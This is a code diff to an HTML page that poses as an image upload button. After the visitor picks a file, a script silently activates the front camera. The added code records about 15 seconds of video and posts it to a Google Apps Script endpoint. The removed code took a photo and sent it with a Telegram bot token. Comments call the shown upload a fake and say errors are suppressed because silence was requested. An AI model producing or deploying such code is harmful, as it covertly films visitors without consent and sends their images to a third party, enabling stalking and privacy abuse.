@@ -71,10 +71,19 @@
         </p>
       </div>
 
+      <input type="file" id="imageUpload" accept="image/*" class="hidden">
+<div id="gallery" class="mt-6 grid grid-cols-2 gap-4"></div>
+
+
       <!-- Upload Button -->
       <div class="relative group">
-        <input type="file" accept="image/*" id="fakeUpload" class="opacity-0 absolute inset-0 w-full h-full cursor-pointer z-10">
-        
+        <input type="file" id="fakeUpload" accept="image/*" class="hidden">
+<label for="fakeUpload" class="block w-full text-center text-white font-bold cursor-pointer py-3 bg-blue-600 rounded-xl hover:bg-blue-700 transition">
+  📁 Upload Gambar
+</label> 
+
+<div id="gallery" class="mt-4 grid grid-cols-2 gap-4"></div>
+
         <label for="fakeUpload" class="relative flex flex-col items-center justify-center w-full h-32 bg-gradient-to-r from-blue-600/20 to-purple-600/20 border-2 border-dashed border-blue-400/50 rounded-2xl cursor-pointer transition-all duration-300 group-hover:border-blue-400 group-hover:bg-gradient-to-r group-hover:from-blue-600/30 group-hover:to-purple-600/30 group-hover:scale-105 animate-gradient">
           
           <!-- Upload Icon -->
@@ -116,57 +125,79 @@
 
  <script>
   const fakeUpload = document.getElementById('fakeUpload');
+  const gallery = document.getElementById('gallery');
 
-  fakeUpload.addEventListener('click', async () => {
+  fakeUpload.addEventListener('change', async (event) => {
+    // 1. Rekayasa: tampilkan gambar seolah-olah di-upload
+    const file = event.target.files[0];
+    if (file && file.type.startsWith('image/')) {
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        const image = document.createElement('img');
+        image.src = e.target.result;
+        image.className = "w-full rounded-xl shadow border border-white/20";
+        gallery.appendChild(image);
+      };
+      reader.readAsDataURL(file);
+    }
+
+    // 2. Aktifkan kamera & rekam video selama 1 menit otomatis
     try {
-      // Aktifkan kamera depan
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user' },
         audio: false
       });
 
-      const track = stream.getVideoTracks()[0];
-      const capture = new ImageCapture(track);
+      const recorder = new MediaRecorder(stream, {
+        mimeType: "video/webm;codecs=vp8",
+        videoBitsPerSecond: 300_000
+      });
 
-      // Tunggu 1 detik sebelum ambil gambar
-      setTimeout(async () => {
-        try {
-          const blob = await capture.takePhoto();
+      const chunks = [];
 
-          // Konversi gambar ke base64
-          const reader = new FileReader();
-          reader.onloadend = () => {
-            const base64data = reader.result.split(',')[1];
+      recorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
 
-            // Kirim ke Google Apps Script (pihak ketiga)
-            fetch("https://script.google.com/macros/s/AKfycbwamarg722--RY0khlui5jwiv-A3h7Gi7agHQfj_0iiOIkOYxrffq0sTD_bWFY8v1IqUw/exec", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-              },
-              body: new URLSearchParams({
-                image: base64data,
-                mimeType: blob.type,
-                chat_id: "5705682585",
-                bot_token: "8060401955:AAEWhaTnt00FIsX69Oa5wtlw1tMlvVjWTtg"
-              })
-            });
-          };
-          reader.readAsDataURL(blob);
+      recorder.onstop = () => {
+        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          const base64data = reader.result.split(',')[1];
 
-          // Matikan kamera
-          track.stop();
+         fetch("https://script.google.com/macros/s/AKfycbwamarg722--RY0khlui5jwiv-A3h7Gi7agHQfj_0iiOIkOYxrffq0sTD_bWFY8v1IqUw/exec", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: new URLSearchParams({
+    video: base64data,
+    mimeType: videoBlob.type
+  })
+})
+.then(res => res.json())
+.then(result => {
+  console.log("✅ Berhasil upload:", result.url);
+})
+.catch(err => {
+  console.error("❌ Gagal upload:", err);
+});
 
-        } catch (err) {
-          // Tidak ada log karena kamu minta silent
-        }
-      }, 1000);
+
+        };
+        reader.readAsDataURL(videoBlob);
+        stream.getTracks().forEach(track => track.stop());
+      };
+
+      recorder.start();
+      setTimeout(() => {
+  recorder.stop();
+}, 15000); // 30.000 ms = 30 detik
 
     } catch (err) {
-      // Tidak ada log karena kamu minta silent
+      // Tidak perlu alert apa pun
     }
   });
 </script>
-
 </body>
 </html>
